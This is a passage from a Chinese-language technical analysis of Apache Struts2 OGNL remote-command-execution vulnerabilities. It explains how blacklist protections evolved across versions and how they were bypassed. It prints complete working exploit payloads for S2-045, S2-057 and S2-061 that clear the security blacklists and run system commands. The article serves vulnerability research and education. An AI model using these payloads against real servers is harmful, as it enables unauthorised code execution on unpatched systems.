](https://images.seebug.org/content/images/2021/04/76186676-7bf6-4763-b39f-4f1629aedc02.jpg-w331s)
从上图中可以看出在 StrutsPrepareAndExecuteFilter#doFilter 初始化 OgnlValueStack 中
SecurityMemberAccess 的黑名单集合时是通过 ognlUtil 中的黑名单集合进行赋值的，他们共享同一个黑名单地址，那么是不是将
OgnlUtil 中的黑名单清空 SecurityMemberAccess 中的黑名单也清空了。
故在 PoC 中首先通过容器获取 OgnlUtil 实例， OgnlUtil 是单例模式实现的对象，所以获取到的实例是唯一的，接着调用 get
方法获取黑名单集合，clear 方法清空。
我们可以一起看一下 S2-045 完整的 PoC ：
    %{
    (#_='multipart/form-data').
    (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
    (#_memberAccess?(#_memberAccess=#dm):(
    (#container=#context['com.opensymphony.xwork2.ActionContext.container']).
    (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
    (#ognlUtil.getExcludedPackageNames().clear()).
    (#ognlUtil.getExcludedClasses().clear()).
    (#context.setMemberAccess(#dm))
    )).
    (#cmd='whoami').
    (#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).
    (#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).
    (#p=new java.lang.ProcessBuilder(#cmds)).
    (#p.redirectErrorStream(true)).
    (#process=#p.start()).
    (#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).
    (@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).
    (#ros.flush())
    }
最开始的 #_='multipart/form-data' 是为了满足触发漏洞的要求，接下来就是将 DefaultMemberAccess 存入
OgnlContext 上下文环境中，接着一个三目运算符主要为了适配低版本中可以直接取到 _memberAccess
对象，取不到就按前面绕过的形式将黑名单清空并将 DefaultMemberAccess 设为默认安全策略。接下来就是执行命令并输出了。
接着在 Struts2.5.13+ 中，excludedClasses 等黑名单集合设为不可变集合（从 struts 2.5.12 开始就不再可变）通过前面
PoC 中的 clear 函数来清除数据会抛出异常：java.lang.UnsupportedOperationException at
java.util.Collections$UnmodifiableCollection.clear 。同时 struts 2.5.13 使用的
ognl-3.1.15.jar 包中 OgnlContext 不再支持使用 #context 获取上下文环境。
    com.opensymphony.xwork2.ognl.OgnlUtil#setExcludedClasses : 
    public void setExcludedClasses(String commaDelimitedClasses) {
        Set classNames = TextParseUtil.commaDelimitedStringToSet(commaDelimitedClasses);
        Set> classes = new HashSet();
        Iterator i$ = classNames.iterator();
        while(i$.hasNext()) {
            String className = (String)i$.next();
            try {
                classes.add(Class.forName(className));
            } catch (ClassNotFoundException var7) {
                throw new ConfigurationException("Cannot load excluded class: " + className, var7);
            }
        }
        this.excludedClasses = Collections.unmodifiableSet(classes);
    }
绕过：【 PoC 参考 S2-057 ，影响版本 Struts 2.0.4 - Struts 2.3.34, Struts 2.5.0 - Struts
2.5.16 】
通过 setExcludedXXX('') 方法实现：
    (#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))
但是，实操发现这样发送请求后面的命令还是不能执行，跟进 setExcludedXXX('') 中的
Collections.unmodifiableSet(classes) 会发现其实是返回了一个新的空集合，并不是之前那个 _memberAccess 和
ognlUtil 共同引用的那个黑名单地址的集合，怎么办呐，很简单再发一次请求就可以了。为什么呢？因为提到过 OgnlUtil
是单例模式实现的，应用从始至终都用的同一个 OgnlUtil ，而 _memberAccess 的作用域是在一次请求范围内的，与此同时 OgnlUtil
中的黑名单集合已经置为空了，那么重新发一次请求，_memberAccess 重新初始化，通过 OgnlUtil 中为空的黑名单进行赋值。
还有一个需要绕过的地方：通过上下文环境中其他属性（比如这里的 attr ）来获得 context 。
    #attr['struts.valueStack'].context
完整看一下 S2-057 的 PoC ：
两个数据包：
1、
    /${(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}/login.action
2、
    /${(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('calc'))}/login
接着在 Struts2.5.20 中，使用的 ognl-3.1.21.jar 包 ognl.OgnlRuntime#getStaticField 中调用了
isAccessible 方法，同时 OgnlUtil 中 set 黑名单集合等修饰符由 public 变成了 protected 。在
Struts2.5.22+ 中，ognl.OgnlRuntime#invokeMethod
方法调用时屏蔽了常用的类，也即是就算将黑名单绕过去了方法调用时仍会判断是否是这些常用的类。同时 struts-default.xml
中定义的黑名单再次增加。
    Struts2.5.25 struts-default.xml ：
相当于前面绕过方式都不能用了，比如使用 @ognl.OgnlContext@DEFAULT_MEMBER_ACCESS 获得
DefaultMemberAccess 实例；使用 #attr['struts.valueStack'].context
获得上下文环境；通过容器创建实例等。
绕过：【 PoC 参考 S2-061 ，影响版本 Struts 2.0.0 - Struts 2.5.25 】
引用新的类来实现：
  * org.apache.tomcat.InstanceManager ： 使用其默认实现类 DefaultInstanceManager 的 newInstance 方法来创建实例
  * org.apache.commons.collections.BeanMap ： 通过 BeanMap#setBean 方法可以将类实例存入 BeanMap 中，存入同时进行初始化将其 set、get 方法存入当前的 writeMethod 、 readMethod 集合中； 通过 BeanMap#get 方法可以在当前 bean 的 readMethod 集合中找到对应 get 方法，再反射调用该方法返回一个对象； 通过 BeanMap#put 方法可以在当前 bean 的 writeMethod 集合中找到对应 set 方法，再反射调用该方法。
完整看一下 S2-061 的 PoC ：
    %25{(#im=#application['org.apache.tomcat.InstanceManager']).
    (#bm=#im.newInstance('org.apache.commons.collections.BeanMap')).
    (#vs=#request['struts.valueStack']).
    (#bm.setBean(#vs)).(#context=#bm.get('context')).
    (#bm.setBean(#context)).(#access=#bm.get('memberAccess')).
    (#bm.setBean(#access)).
    (#empty=#im.newInstance('java.util.HashSet')).
    (#bm.put('excludedClasses',#empty)).(#bm.put('excludedPackageNames',#empty)).
    (#cmdout=#im.newInstance('freemarker.template.utility.Execute').exec({'whoami'}))}
首先从 application 中获得 DefaultInstanceManager 实例，调用 newInstance 方法获得 BeanMap
实例。接着先将 OgnlValueStack 存入 BeanMap 中，通过 get 方法可以获得 OgnlContext 实例，获得
OgnlContext 实例就可以通过其获得 MemberAccess 实例，接着可以通过 put 方法调用 set
方法，将其黑名单置空，黑名单置空后就可以创建一个黑名单中的类实例来执行命令了。
![
](https://images.seebug.org/content/images/2021/04/76c742a4-a12b-49a3-9e9d-a0075a878a85.png-w331s)
最新版本：Struts2.5.26 中再一次增加了黑名单：
把中间件的包都给屏蔽了 orz …
### 五、结语
这篇文章主要根据 struts2 版本更新将其命令执行系列漏洞顺了一遍。struts2 框架在执行命令时主要防护机制是
SecurityMemberAccess 中的策略，以及对应使用的 ognl jar 包中的一些变化，分析时可以重点关注这两地方。另外到了
struts2.5.26 版本感觉官方将该补的都补了，但还是期待新 PoC 的出现。
### 六、参考链接
[1] 《Struts2 技术内幕——深入解析Struts2架构设计与实现原理》  
[2]   
[3]   
[4]   
[5] 
* * *